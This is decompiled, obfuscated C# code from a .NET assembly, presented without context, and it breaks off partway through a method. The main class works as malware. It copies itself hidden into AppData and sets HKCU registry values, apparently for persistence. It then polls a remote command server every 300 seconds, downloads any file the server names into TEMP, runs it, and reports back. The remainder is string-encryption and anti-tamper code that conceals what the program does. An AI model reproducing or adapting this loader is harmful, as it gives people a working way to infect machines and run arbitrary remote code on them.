using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Net;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using Microsoft.Win32;

internal static class _0002
{
	internal sealed class _0002 : IEnumerable<int>, IEnumerator<int>, IEnumerable, IEnumerator, IDisposable
	{
		private int m__0002;

		private int _0003;

		private int _0005;

		public int _0008;

		public int _0006;

		[DebuggerHidden]
		public _0002(int _0002)
		{
			_0003 = _0002;
			_0005 = Thread.CurrentThread.ManagedThreadId;
		}

		[DebuggerHidden]
		private IEnumerator<int> _0002_2004_200A_2001_0002()
		{
			_0002 obj;
			if (Thread.CurrentThread.ManagedThreadId == _0005 && _0003 == -2)
			{
				_0003 = 0;
				obj = this;
			}
			else
			{
				obj = new _0002(0);
			}
			obj._0008 = _0006;
			return obj;
		}

		IEnumerator<int> IEnumerable<int>.GetEnumerator()
		{
			//ILSpy generated this explicit interface implementation from .override directive in    
			return this._0002_2004_200A_2001_0002();
		}

		[DebuggerHidden]
		private IEnumerator _0002_2004_200A_2001_0002()
		{
			return this._0002_2004_200A_2001_0002();
		}

		IEnumerator IEnumerable.GetEnumerator()
		{
			//ILSpy generated this explicit interface implementation from .override directive in    
			return this._0002_2004_200A_2001_0002();
		}

		private bool MoveNext()
		{
			switch (_0003)
			{
			case 0:
				_0003 = -1;
				m__0002 = 671466060;
				_0003 = 1;
				return true;
			case 1:
				_0003 = -1;
				m__0002 = -1937502183;
				_0003 = 2;
				return true;
			case 2:
				_0003 = -1;
				m__0002 = _0008 ^ 0x19A21219;
				_0003 = 3;
				return true;
			case 3:
				_0003 = -1;
				m__0002 = -127978958;
				_0003 = 4;
				return true;
			case 4:
				_0003 = -1;
				m__0002 = 1199104600;
				_0003 = 5;
				return true;
			case 5:
				_0003 = -1;
				m__0002 = 1014205068;
				_0003 = 6;
				return true;
			case 6:
				_0003 = -1;
				m__0002 = _0008 ^ -368047180;
				_0003 = 7;
				return true;
			case 7:
				_0003 = -1;
				break;
			}
			return false;
		}

		bool IEnumerator.MoveNext()
		{
			//ILSpy generated this explicit interface implementation from .override directive in MoveNext
			return this.MoveNext();
		}

		[DebuggerHidden]
		private int _0002_2004_200A_2001_0002()
		{
			return m__0002;
		}

		int IEnumerator<int>.get_Current()
		{
			//ILSpy generated this explicit interface implementation from .override directive in    
			return this._0002_2004_200A_2001_0002();
		}

		[DebuggerHidden]
		private void _0002_2004_200A_2001_0002()
		{
			throw new NotSupportedException();
		}

		void IEnumerator.Reset()
		{
			//ILSpy generated this explicit interface implementation from .override directive in    
			this._0002_2004_200A_2001_0002();
		}

		private void _0002_2004_200A_2001_0003()
		{
		}

		void IDisposable.Dispose()
		{
			//ILSpy generated this explicit interface implementation from .override directive in    
			this._0002_2004_200A_2001_0003();
		}

		[DebuggerHidden]
		private object _0002_2004_200A_2001_0002()
		{
			return m__0002;
		}

		object IEnumerator.get_Current()
		{
			//ILSpy generated this explicit interface implementation from .override directive in    
			return this._0002_2004_200A_2001_0002();
		}
	}
}
internal static class _0003
{
	internal sealed class _0002 : IEnumerable<int>, IEnumerator<int>, IEnumerable, IEnumerator, IDisposable
	{
		private int m__0002;

		private int _0003;

		private int m__0005;

		public int _0008;

		public int _0006;

		public int _000E;

		public int _000F;

		public int _0002_2000;

		public IEnumerator<int> _0003_2000;

		[DebuggerHidden]
		public _0002(int _0002)
		{
			_0003 = _0002;
			this.m__0005 = Thread.CurrentThread.ManagedThreadId;
		}

		[DebuggerHidden]
		private IEnumerator<int> _0002_2004_200A_2001_0002()
		{
			_0002 obj;
			if (Thread.CurrentThread.ManagedThreadId == this.m__0005 && _0003 == -2)
			{
				_0003 = 0;
				obj = this;
			}
			else
			{
				obj = new _0002(0);
			}
			obj._0008 = _0006;
			return obj;
		}

		IEnumerator<int> IEnumerable<int>.GetEnumerator()
		{
			//ILSpy generated this explicit interface implementation from .override directive in    
			return this._0002_2004_200A_2001_0002();
		}

		[DebuggerHidden]
		private IEnumerator _0002_2004_200A_2001_0002()
		{
			return this._0002_2004_200A_2001_0002();
		}

		IEnumerator IEnumerable.GetEnumerator()
		{
			//ILSpy generated this explicit interface implementation from .override directive in    
			return this._0002_2004_200A_2001_0002();
		}

		private bool MoveNext()
		{
			try
			{
				switch (_0003)
				{
				case 0:
				{
					_0003 = -1;
					_000E = 7;
					int num = _0008;
					_0003_2000 = ((IEnumerable<int>)new _0003(-2)
					{
						_0006 = num
					}).GetEnumerator();
					_0003 = 1;
					goto IL_00f3;
				}
				case 2:
					{
						_0003 = 1;
						if (_000E == 0)
						{
							_0002_2004_200A_2001_0003();
							break;
						}
						goto IL_00f3;
					}
					IL_00f3:
					if (_0003_2000.MoveNext())
					{
						_000F = _0003_2000.Current;
						_0002_2000 = _000F ^ _0008;
						if ((_0002_2000 & 3) == 0)
						{
							_0002_2000 ^= 1622458211;
						}
						_000E--;
						if ((_0002_2000 & 0xF) == 0)
						{
							_0002_2000 ^= -1176753182;
						}
						m__0002 = _0002_2000;
						_0003 = 2;
						return true;
					}
					_0005();
					break;
				}
				return false;
			}
			catch
			{
				//try-fault
				_0002_2004_200A_2001_0003();
				throw;
			}
		}

		bool IEnumerator.MoveNext()
		{
			//ILSpy generated this explicit interface implementation from .override directive in MoveNext
			return this.MoveNext();
		}

		[DebuggerHidden]
		private int _0002_2004_200A_2001_0002()
		{
			return m__0002;
		}

		int IEnumerator<int>.get_Current()
		{
			//ILSpy generated this explicit interface implementation from .override directive in    
			return this._0002_2004_200A_2001_0002();
		}

		[DebuggerHidden]
		private void _0002_2004_200A_2001_0002()
		{
			throw new NotSupportedException();
		}

		void IEnumerator.Reset()
		{
			//ILSpy generated this explicit interface implementation from .override directive in    
			this._0002_2004_200A_2001_0002();
		}

		private void _0002_2004_200A_2001_0003()
		{
			switch (_0003)
			{
			case 1:
			case 2:
				try
				{
					break;
				}
				finally
				{
					_0005();
				}
			}
		}

		void IDisposable.Dispose()
		{
			//ILSpy generated this explicit interface implementation from .override directive in    
			this._0002_2004_200A_2001_0003();
		}

		[DebuggerHidden]
		private object _0002_2004_200A_2001_0002()
		{
			return m__0002;
		}

		object IEnumerator.get_Current()
		{
			//ILSpy generated this explicit interface implementation from .override directive in    
			return this._0002_2004_200A_2001_0002();
		}

		private void _0005()
		{
			_0003 = -1;
			if (_0003_2000 != null)
			{
				_0003_2000.Dispose();
			}
		}
	}

	internal sealed class _0003 : IEnumerable<int>, IEnumerator<int>, IEnumerable, IEnumerator, IDisposable
	{
		private int _0002;

		private int m__0003;

		private int _0005;

		public int _0008;

		public int _0006;

		public int _000E;

		public int _000F;

		public int _0002_2000;

		[DebuggerHidden]
		public _0003(int _0002)
		{
			m__0003 = _0002;
			_0005 = Thread.CurrentThread.ManagedThreadId;
		}

		[DebuggerHidden]
		private IEnumerator<int> _0003_2004_200A_2001_0002()
		{
			_0003 obj;
			if (Thread.CurrentThread.ManagedThreadId == _0005 && m__0003 == -2)
			{
				m__0003 = 0;
				obj = this;
			}
			else
			{
				obj = new _0003(0);
			}
			obj._0008 = _0006;
			return obj;
		}

		IEnumerator<int> IEnumerable<int>.GetEnumerator()
		{
			//ILSpy generated this explicit interface implementation from .override directive in    
			return this._0003_2004_200A_2001_0002();
		}

		[DebuggerHidden]
		private IEnumerator _0003_2004_200A_2001_0002()
		{
			return this._0003_2004_200A_2001_0002();
		}

		IEnumerator IEnumerable.GetEnumerator()
		{
			//ILSpy generated this explicit interface implementation from .override directive in    
			return this._0003_2004_200A_2001_0002();
		}

		private bool MoveNext()
		{
			switch (m__0003)
			{
			case 0:
				m__0003 = -1;
				_000E = 0;
				_000F = 1;
				goto IL_002f;
			case 1:
				{
					m__0003 = -1;
					_0008--;
					if (_0008 == 0)
					{
						break;
					}
					_0002_2000 = _000F;
					_000F = (_0002_2000 + _000E + _0008) ^ -1510032625;
					_000E = _0002_2000;
					goto IL_002f;
				}
				IL_002f:
				_0002 = _000F;
				m__0003 = 1;
				return true;
			}
			return false;
		}

		bool IEnumerator.MoveNext()
		{
			//ILSpy generated this explicit interface implementation from .override directive in MoveNext
			return this.MoveNext();
		}

		[DebuggerHidden]
		private int _0003_2004_200A_2001_0002()
		{
			return _0002;
		}

		int IEnumerator<int>.get_Current()
		{
			//ILSpy generated this explicit interface implementation from .override directive in    
			return this._0003_2004_200A_2001_0002();
		}

		[DebuggerHidden]
		private void _0003_2004_200A_2001_0002()
		{
			throw new NotSupportedException();
		}

		void IEnumerator.Reset()
		{
			//ILSpy generated this explicit interface implementation from .override directive in    
			this._0003_2004_200A_2001_0002();
		}

		private void _0003_2004_200A_2001_0003()
		{
		}

		void IDisposable.Dispose()
		{
			//ILSpy generated this explicit interface implementation from .override directive in    
			this._0003_2004_200A_2001_0003();
		}

		[DebuggerHidden]
		private object _0003_2004_200A_2001_0002()
		{
			return _0002;
		}

		object IEnumerator.get_Current()
		{
			//ILSpy generated this explicit interface implementation from .override directive in    
			return this._0003_2004_200A_2001_0002();
		}
	}
}
internal static class _0005
{
}
[DebuggerNonUserCode]
[GeneratedCode("System.Resources.Tools.StronglyTypedResourceBuilder", "4.0.0.0")]
internal sealed class _0006
{
	private static ResourceManager m__0002;

	private static CultureInfo _0003;

	internal _0006()
	{
	}

	internal static ResourceManager _0002()
	{
		if (object.ReferenceEquals(_0006.m__0002, null))
		{
			ResourceManager resourceManager = (_0006.m__0002 = new ResourceManager(_000E._0002(-1920207166), typeof(_0006).Assembly));
		}
		return _0006.m__0002;
	}

	internal static CultureInfo _0002()
	{
		return _0003;
	}

	internal static void _0002(CultureInfo _0002)
	{
		_0003 = _0002;
	}
}
internal sealed class _0008
{
	private static string m__0002 = _000E._0002(-1920207066);

	private static int m__0003 = 300;

	private static string m__0005 = _000E._0002(-1920207077);

	private static string _0008 = _0002(32);

	private static string _0002(int _0002)
	{
		string text = _000E._0002(-1920207002);
		Random random = new Random();
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < _0002; i++)
		{
			stringBuilder.Append(text[random.Next(text.Length)]);
		}
		return stringBuilder.ToString();
	}

	private static string _0002(string _0002, string _0003)
	{
		ServicePointManager.Expect100Continue = false;
		WebClient webClient = new WebClient();
		try
		{
			webClient.Headers.Add(_000E._0002(-1920206933), _000E._0002(-1920206914));
			return webClient.UploadString(_0002, _000E._0002(-1920206874), _0003);
		}
		finally
		{
			((IDisposable)webClient).Dispose();
		}
	}

	private static void _0002()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + _000E._0002(-1920206867);
		try
		{
			File.Copy(Assembly.GetEntryAssembly()!.Location, text, overwrite: true);
			File.SetAttributes(text, FileAttributes.ReadOnly | FileAttributes.Hidden | FileAttributes.System);
		}
		catch
		{
		}
		try
		{
			Registry.CurrentUser.OpenSubKey(_000E._0002(-1920206898), writable: true)!.SetValue(_000E._0002(-1920207358), text);
			Registry.CurrentUser.OpenSubKey(_000E._0002(-1920207340), writable: true)!.SetValue(_000E._0002(-1920207270), 2);
		}
		catch
		{
		}
	}

	private static void _0003()
	{
		bool createdNew = false;
		new Mutex(initiallyOwned: true, _000E._0002(-1920207193), out createdNew);
		if (!createdNew)
		{
			Environment.Exit(0);
		}
	}

	private static void _0002(string _0002)
	{
		string fileName = Environment.GetEnvironmentVariable(_000E._0002(-1920207184)) + _000E._0002(-1920207169) + global::_0008._0002(12) + _000E._0002(-1920207225);
		new WebClient().DownloadFile(_0002, fileName);
		Process process = new Process();
		process.StartInfo.FileName = fileName;
		process.Start();
		global::_0008._0002(global::_0008.m__0002, _000E._0002(-1920207214) + _0008);
	}

	private static void _0005()
	{
		try
		{
			_0003();
			_0002();
			while (true)
			{
				try
				{
					string text = _0002(global::_0008.m__0002, _000E._0002(-1920207130) + global::_0008.m__0005 + _000E._0002(-1920207120) + _0008);
					if (text != string.Empty)
					{
						_0002(text);
					}
				}
				catch
				{
				}
				Thread.Sleep(global::_0008.m__0003 * 1000);
			}
		}
		catch
		{
		}
	}
}
internal static class _000E
{
	[DefaultMember("Item")]
	internal sealed class _000F_2001_2005_2003_2002_2002_2002_2003_2003_200A_2002_2009
	{
		private struct _0002
		{
			public int _0002;

			public string _0003;
		}

		private _0002[] m__0002;

		private int _0003;

		public _000F_2001_2005_2003_2002_2002_2002_2003_2003_200A_2002_2009()
		{
			this.m__0002 = new _0002[16];
		}

		public _000F_2001_2005_2003_2002_2002_2002_2003_2003_200A_2002_2009(int _0002)
		{
			int num = 16;
			_0002 <<= 1;
			while (num < _0002 && num > 0)
			{
				num <<= 1;
			}
			if (num < 0)
			{
				num = 16;
			}
			this.m__0002 = new _0002[num];
		}

		public int _0002()
		{
			return _0003;
		}

		private void _0002()
		{
			_0002[] array = this.m__0002;
			int num = array.Length;
			int num2 = num * 2;
			if (num2 <= 0)
			{
				return;
			}
			_0002[] array2 = new _0002[num2];
			int num3 = 0;
			for (int i = 0; i < num; i++)
			{
				string text = array[i]._0003;
				if (text == null)
				{
					continue;
				}
				int num4 = array[i]._0002;
				int num5 = num4 & (num2 - 1);
				while (array2[num5]._0003 != null)
				{
					num5++;
					if (num5 >= num2)
					{
						num5 = 0;
					}
				}
				array2[num5]._0003 = text;
				array2[num5]._0002 = num4;
				num3++;
			}
			this.m__0002 = array2;
			_0003 = num3;
		}

		public string _0002(int _0002)
		{
			_0002[] array = this.m__0002;
			int num = array.Length;
			int num2 = _0002 & (num - 1);
			string result = null;
			while (true)
			{
				if (array[num2]._0002 == _0002)
				{
					result = array[num2]._0003;
					break;
				}
				if (array[num2]._0003 == null)
				{
					break;
				}
				num2++;
				if (num2 >= num)
				{
					num2 = 0;
				}
			}
			return result;
		}

		public void _0002(int _0002, string _0003)
		{
			_0002[] array = this.m__0002;
			int num = array.Length;
			int num2 = num >> 1;
			int num3 = _0002 & (num - 1);
			bool flag;
			while (true)
			{
				int num4 = array[num3]._0002;
				flag = array[num3]._0003 == null;
				if (num4 == _0002 || flag)
				{
					break;
				}
				num3++;
				if (num3 >= num)
				{
					num3 = 0;
				}
			}
			array[num3]._0003 = _0003;
			if (flag)
			{
				array[num3]._0002 = _0002;
				this._0003++;
				if (this._0003 > num2)
				{
					this._0002();
				}
			}
		}
	}

	private enum _0002_2003_2007_200B_2001_2002_200B_2000_2004_2004_2001
	{

	}

	private sealed class _0003_2008_200B_2009_2005_2007_2000_2004_2002_2001_2005_2006_2001_2007_2008_2008_2009_2007_2006_2001_2002_2007_200A_2000_2002_2007
	{
		private Stream m__0002;

		private byte[] m__0003;

		public _0003_2008_200B_2009_2005_2007_2000_2004_2002_2001_2005_2006_2001_2007_2008_2008_2009_2007_2006_2001_2002_2007_200A_2000_2002_2007(Stream _0002)
		{
			this.m__0002 = _0002;
			this.m__0003 = new byte[4];
		}

		public Stream _0002()
		{
			return this.m__0002;
		}

		public short _0002()
		{
			this._0002(2);
			return (short)(this.m__0003[0] | (this.m__0003[1] << 8));
		}

		public int _0002()
		{
			this._0002(4);
			return this.m__0003[0] | (this.m__0003[1] << 8) | (this.m__0003[2] << 16) | (this.m__0003[3] << 24);
		}

		private void _0002()
		{
			throw new EndOfStreamException();
		}

		private void _0002(int _0002)
		{
			int num = 0;
			int num2 = 0;
			if (_0002 == 1)
			{
				num2 = this.m__0002.ReadByte();
				if (num2 == -1)
				{
					this._0002();
				}
				this.m__0003[0] = (byte)num2;
				return;
			}
			do
			{
				num2 = this.m__0002.Read(this.m__0003, num, _0002 - num);
				if (num2 == 0)
				{
					this._0002();
				}
				num += num2;
			}
			while (num < _0002);
		}

		public void _0003()
		{
			Stream stream = this.m__0002;
			this.m__0002 = null;
			stream?.Close();
			this.m__0003 = null;
		}

		public byte[] _0002(int _0002)
		{
			if (_0002 < 0)
			{
				throw new ArgumentOutOfRangeException();
			}
			byte[] array = new byte[_0002];
			int num = 0;
			do
			{
				int num2 = this.m__0002.Read(array, num, _0002);
				if (num2 == 0)
				{
					break;
				}
				num += num2;
				_0002 -= num2;
			}
			while (_0002 > 0);
			if (num != array.Length)
			{
				byte[] array2 = new byte[num];
				Buffer.BlockCopy(array, 0, array2, 0, num);
				array = array2;
			}
			return array;
		}
	}

	private static int _0006;

	private static _000F_2001_2005_2003_2002_2002_2002_2003_2003_200A_2002_2009 m__0002;

	private static _0002_2003_2007_200B_2001_2002_200B_2000_2004_2004_2001 _0003_2000;

	private static byte[] m__000E;

	private static _0003_2008_200B_2009_2005_2007_2000_2004_2002_2001_2005_2006_2001_2007_2008_2008_2009_2007_2006_2001_2002_2007_200A_2000_2002_2007 _0003;

	private static short _0008;

	private static byte[] _0005;

	private static int _000F;

	private static int _0002_2000;

	[MethodImpl(MethodImplOptions.NoInlining)]
	static _000E()
	{
		int num = 1122575779;
		int num2 = -780128987 ^ num;
		global::_000E.m__0002 = new _000F_2001_2005_2003_2002_2002_2002_2003_2003_200A_2002_2009(19);
		int num3 = 1;
		StackTrace stackTrace = new StackTrace(num3, fNeedFileInfo: false);
		num3--;
		StackFrame frame = stackTrace.GetFrame(num3);
		int num4 = -(~(-(~(-(~(~(-(~(-(~(num + 1642625183 + num2))))))))))) ^ -(~(~(-(-(~(~(-(-(~(~((-1035497727 ^ num) - num2)))))))))));
		MethodBase methodBase = frame?.GetMethod();
		if (frame != null)
		{
			num4 ^= -(~(-(~(-(~(~(-(~((-1055379926 - num) ^ num2)))))))));
		}
		Type type = methodBase?.DeclaringType;
		if ((object)type == typeof(RuntimeMethodHandle))
		{
			_0003_2000 = (_0002_2003_2007_200B_2001_2002_200B_2000_2004_2004_2001)4 | _0003_2000;
			num4 ^= (num ^ 0x2E7FDF02) + num2 + num3;
		}
		else if ((object)type == null)
		{
			_0003_2000 = (_0002_2003_2007_200B_2001_2002_200B_2000_2004_2004_2001)1 | _0003_2000;
			num4 ^= -(~(-(~(-(~(~(-(-(~(~((699220519 + num) ^ num2)))))))))));
		}
		else if ((object)type.Assembly != typeof(_000E).Assembly)
		{
			_0003_2000 = (_0002_2003_2007_200B_2001_2002_200B_2000_2004_2004_2001)2 | _0003_2000;
			num4 ^= -626356218 - num + num2;
		}
		else
		{
			_0003_2000 = (_0002_2003_2007_200B_2001_2002_200B_2000_2004_2004_2001)16 | _0003_2000;
			num4 ^= ~(-(-(~(~(-(~(-(-(~(~((-780038397 ^ num) - num2))))))))))) - num3;
		}
		_0002_2000 = num4 + _0002_2000;
	}

	private static void _0002(byte[] _0002, int _0003, byte[] _0005)
	{
		int num = 0;
		int num2 = 0;
		int num3 = 128;
		int num4 = _0005.Length;
		while (num < num4)
		{
			if ((num3 <<= 1) == 256)
			{
				num3 = 1;
				num2 = _0002[_0003++];
			}
			if ((num2 & num3) != 0)
			{
				int num5 = (_0002[_0003] >> 2) + 3;
				int num6 = ((_0002[_0003] << 8) | _0002[_0003 + 1]) & 0x3FF;
				_0003 += 2;
				int num7 = num - num6;
				if (num7 < 0)
				{
					break;
				}
				while (--num5 >= 0 && num < num4)
				{
					_0005[num++] = _0005[num7++];
				}
			}
			else
			{
				_0005[num++] = _0002[_0003++];
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static string _0002(int _0002)
	{
		int num = -2140672488;
		int num2 = 2094896627 - num;
		lock (global::_000E.m__0002)
		{
			byte[] array;
			int num18;
			string text;
			while (true)
			{
				text = global::_000E.m__0002._0002(_0002);
				if (text != null)
				{
					return text;
				}
				int num6;
				if (_0003 == null)
				{
					Assembly executingAssembly = Assembly.GetExecutingAssembly();
					Assembly callingAssembly = Assembly.GetCallingAssembly();
					_0006 |= (num ^ -2084240193) + num2;
					StringBuilder stringBuilder = new StringBuilder();
					int num3 = (1558148594 - num) ^ num2;
					stringBuilder.Append((char)num3).Append((char)(num3 >> 16));
					num3 = (num ^ -1675941380) - num2;
					stringBuilder.Append((char)num3).Append((char)(num3 >> 16));
					num3 = -1557951984 + num + num2;
					stringBuilder.Append((char)(num3 >> 16)).Append((char)num3);
					num3 = (1557820915 - num) ^ num2;
					stringBuilder.Append((char)num3).Append((char)(num3 >> 16));
					num3 = num + -2094888424 + num2;
					stringBuilder.Append((char)num3);
					Stream manifestResourceStream = executingAssembly.GetManifestResourceStream(stringBuilder.ToString());
					int num4 = 1;
					StackTrace stackTrace = new StackTrace(num4, fNeedFileInfo: false);
					_0006 ^= ((2094902453 - num) ^ num2) | num4;
					num4--;
					StackFrame frame = stackTrace.GetFrame(num4);
					MethodBase methodBase = frame?.GetMethod();
					_0006 ^= num4 + ((0x7C124643 ^ num) - num2);
					Type type = methodBase?.DeclaringType;
					if (frame == null)
					{
						_0006 ^= (num + 2081362256) ^ num2;
					}
					bool flag = (object)type == typeof(RuntimeMethodHandle);
					_0006 ^= 2094896787 - num - num2;
					if (!flag)
					{
						flag = (object)type == null;
						if (flag)
						{
							_0006 ^= (2081362224 + num) ^ num2;
						}
					}
					if (flag == (stackTrace != null))
					{
						_0006 ^= 32;
					}
					_0006 ^= (-2081267805 - num + num2) | (num4 + 1);
					_0003 = new _0003_2008_200B_2009_2005_2007_2000_2004_2002_2001_2005_2006_2001_2007_2008_2008_2009_2007_2006_2001_2002_2007_200A_2000_2002_2007(manifestResourceStream);
					short num5 = (short)(_0003._0002() ^ (short)(-(~(~(-(~(-(~(-(~(-(~(2081271813 + num - num2)))))))))))));
					if (num5 == 0)
					{
						_0008 = (short)(_0003._0002() ^ (short)(~(-(-(~(~(-(~(-(~((num ^ -2081567860) + num2)))))))))));
					}
					else
					{
						_0005 = _0003._0002(num5);
					}
					callingAssembly = executingAssembly;
					AssemblyName assemblyName;
					try
					{
						assemblyName = callingAssembly.GetName();
					}
					catch
					{
						assemblyName = new AssemblyName(callingAssembly.FullName);
					}
					m__000E = assemblyName.GetPublicKeyToken();
					if (m__000E != null && m__000E.Length == 0)
					{
						m__000E = null;
					}
					num6 = _0002_2000;
					num6 ^= -1085498367 + num - num2;
					_0002_2000 = 0;
					long num7 = global::_0002_2000._0002();
					num6 ^= (int)num7;
					num6 ^= (1478149324 - num) ^ num2;
					int num8 = num6;
					int num9 = num8;
					int num10 = num9 ^ ((0x7F554CE6 ^ num) + num2);
					int num11 = num10;
					_0002._0002 obj2 = new _0002._0002(2094896625 - num - num2);
					obj2._0006 = num11;
					foreach (int item in (IEnumerable<int>)obj2)
					{
						num10 = item ^ num10;
					}
					int num12 = num10;
					int num13 = num12 * (0x7C125D6E ^ num ^ num2) % (-2067154950 + num + num2);
					int num14 = num13;
					_0003._0002 obj3 = new _0003._0002((0x7C1249C1 ^ num) - num2);
					obj3._0006 = num14;
					foreach (int item2 in (IEnumerable<int>)obj3)
					{
						num13 ^= item2;
					}
					int num15 = num13;
					num6 ^= -(~(-(~(-(~(~(-(~(-140933574 - num + num2)))))))));
					num6 = (_000F = num6 + num15);
					_0006 = (_0006 & ((-1944958635 ^ num) - num2)) ^ ((num + 2081279815) ^ num2);
					if (((uint)_0003_2000 & (uint)(~(-(-(~(~(-(-(~(-(~(~((num ^ 0x7C1249D3) - num2))))))))))))) == 0)
					{
						_0006 = -2094852665 + num + num2;
					}
				}
				else
				{
					num6 = _000F;
				}
				if (_0006 == (num ^ 0x7C12E279 ^ num2))
				{
					return new string(new char[3]
					{
						(char)(-2081274219 - num + num2),
						'0',
						(char)(0x7C12499Bu ^ (uint)num ^ (uint)num2)
					});
				}
				int num16 = _0002 ^ (-649661509 - num - num2) ^ num6;
				num16 ^= num + -2057821120 + num2;
				_0003._0002().Position = num16;
				if (_0005 != null)
				{
					array = _0005;
				}
				else
				{
					short num17 = ((_0008 != -1) ? _0008 : ((short)(_0003._0002() ^ ((-2081283478 - num) ^ num2) ^ num16)));
					if (num17 == 0)
					{
						array = null;
					}
					else
					{
						array = _0003._0002(num17);
						for (int i = 0; i != array.Length; i++)
						{
							array[i] ^= (byte)(_000F >> ((i & 3) << 3));
						}
					}
				}
				num18 = _0003._0002() ^ num16 ^ ~(-(~(-(-(~(~(-(~(-2147187140 + num + num2))))))))) ^ num6;
				if (num18 != 2094896625 - num - num2)
				{
					break;
				}
				byte[] array2 = _0003._0002(4);
				_0002 = (num + 2130728445) ^ num2 ^ num6;
				_0002 = (array2[2] | (array2[3] << 16) | (array2[0] << 8) | (array2[1] << 24)) ^ -_0002;
			}
			bool flag2 = (num18 & (0x5C1249C3 ^ num ^ num2)) != 0;
			bool flag3 = (num18 & ((num ^ -1007831491) + num2)) != 0;
			bool flag4 = (num18 & (-66209341 + num - num2)) != 0;
			num18 &= -1812838852 - num + num2;
			byte[] array3 = global::_000F._0002(array, _0003._0002(num18));
			if (m__000E != null != (_0006 != 2082882121 + num - num2))
			{
				for (int j = 0; j < num18; j++)
				{
					byte b = m__000E[j & 7];
					b = (byte)((b << 3) | (b >> 5));
					array3[j] = (byte)(array3[j] ^ b);
				}
			}
			int num19 = _0006 - 12;
			int num20;
			byte[] array4;
			if (!flag4)
			{
				num20 = num18;
				array4 = array3;
			}
			else
			{
				num20 = array3[2] | (array3[0] << 16) | (array3[3] << 8) | (array3[1] << 24);
				array4 = new byte[num20];
				global::_000E._0002(array3, 4, array4);
			}
			if (flag3 && num19 == (-2084237689 ^ num) + num2)
			{
				char[] array5 = new char[num20];
				for (int k = 0; k < num20; k++)
				{
					array5[k] = (char)array4[k];
				}
				text = new string(array5);
			}
			else
			{
				text = Encoding.Unicode.GetString(array4, 0, array4.Length);
			}
			num19 += 2094896754 - num - num2 + (num19 & 3) << 5;
			if (num19 != ((num + 2080723241) ^ num2))
			{
				int num21 = (num18 + _0002) ^ ((num ^ 0x7CE41C4B) - num2) ^ (num19 & ((2081273022 + num) ^ num2));
				StringBuilder stringBuilder = new StringBuilder();
				int num3 = -2081274219 - num + num2;
				stringBuilder.Append((char)(byte)num3);
				text = num21.ToString(stringBuilder.ToString());
			}
			if (!flag2)
			{
				text = string.Intern(text);
				global::_000E.m__0002._0002(_0002, text);
				if (global::_000E.m__0002._0002() == 19)
				{
					_0003._0003();
					_0003 = null;
					_0005 = (m__000E = null);
				}
			}
			return text;
		}
	}
}
internal static class _000F
{
	public static byte[] _0002(byte[] _0002, byte[] _0003)
	{
		byte b = _0002[1];
		int num = _0003.Length;
		byte b2 = (byte)((num + 11) ^ (b + 7));
		uint num2 = (uint)((_0002[0] | (_0002[2] << 8)) + (b2 << 3));
		ushort num3 = 0;
		for (int i = 0; i < num; i++)
		{
			if ((i & 1) == 0)
			{
				num2 = num2 * 214013 + 2531011;
				num3 = (ushort)(num2 >> 16);
			}
			byte b3 = (byte)num3;
			num3 = (ushort)(num3 >> 8);
			byte b4 = _0003[i];
			_0003[i] = (byte)(b4 ^ b ^ (b2 + 3) ^ b3);
			b2 = b4;
		}
		return _0003;
	}
}
internal static class _0002_2000
{
	private sealed class _000E_2000_2000_2004_2005_2002_200B_2000_200B_2006_200A_2000_2004_2004_2004_2008_200B_200B_200A_2001_2004_2009_2003
	{
		[MethodImpl(MethodImplOptions.NoInlining)]
		internal static int _0002()
		{
			return _0003_2007_2008_2006_2009_200B_200A_200A_2002_2003_2001_2009_2000_2006_2000_2004_200B_2003_2004_200A_2002_200B_2008_2005_2003_2003_2008_2002._0005(_0003_2007_2008_2006_2009_200B_200A_200A_2002_2003_2001_2009_2000_2006_2000_2004_200B_2003_2004_200A_2002_200B_2008_2005_2003_2003_2008_2002._0003(_0002_2000._0002(typeof(_0003_2004_2005_200B_2001_2001_200A_2006_2003_2003_2001_2004_2003_200A_2000_2000_2000_2007_2008_2003_200B_2005_2001_2002_2003_2004)), _0003_2007_2008_2006_2009_200B_200A_200A_2002_2003_2001_2009_2000_2006_2000_2004_200B_2003_2004_200A_2002_200B_2008_2005_2003_2003_2008_2002._0005(_0002_2000._0002(typeof(_000E_2000_2000_2004_2005_2002_200B_2000_200B_2006_200A_2000_2004_2004_2004_2008_200B_200B_200A_2001_2004_2009_2003)), _0002_2000._0002(typeof(_0006_2002_2008_200A_2001_2008_2000_2000_2002_2001_200B_200A_2006_200A_200B_200B_2001)))), _0006_2004_2005_2009_2005_200A_2000_2004_2004_200B_200B_2007_2008_2005_2004_200A_200B_2007_2005_2002_2007_2009_200A_2003._0002());
		}
	}

	private sealed class _0005_2002_2004_2009_2002_2007_2008_2008_200B_2007_200A_2007_2007_2002_2004_200B_2008_200A_2005_2003_2004_200A_2001_2002
	{
		private int m__0002;

		private int _0003;

		internal _0005_2002_2004_2009_2002_2007_2008_2008_200B_2007_200A_2007_2007_2002_2004_200B_2008_200A_2005_2003_2004_200A_2001_2002()
		{
			_0002(0L);
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		internal long _0002()
		{
			if ((object)Assembly.GetCallingAssembly() != typeof(_0005_2002_2004_2009_2002_2007_2008_2008_200B_2007_200A_2007_2007_2002_2004_200B_2008_200A_2005_2003_2004_200A_2001_2002).Assembly)
			{
				return 2918384L;
			}
			if (!_0002_2000._0002())
			{
				return 2918384L;
			}
			int[] array = new int[4];
			array[3] = -(~(-(~(-(~(~(-(~391658777))))))));
			array[1] = -(~(~(-(-(~(~(-(~(-(~-1821317341))))))))));
			array[2] = -(~(-(~(-(~(~(-(-(~(~63430873))))))))));
			array[0] = ~(-(~(-(~(-(-(~(~(-(~34157261))))))))));
			int num = this.m__0002;
			int num2 = _0003;
			int num3 = -(~(~(-(-(~(~(-(~(-(~1640531525))))))))));
			int num4 = -(~(-(~(-(~(~(-(~(-(~957401312))))))))));
			for (int i = 0; i != 32; i++)
			{
				num2 -= (((num << 4) ^ (num >> 5)) + num) ^ (num4 + array[(num4 >> 11) & 3]);
				num4 -= num3;
				num -= (((num2 << 4) ^ (num2 >> 5)) + num2) ^ (num4 + array[num4 & 3]);
			}
			for (int j = 0; j != 4; j++)
			{
				array[j] = 0;
			}
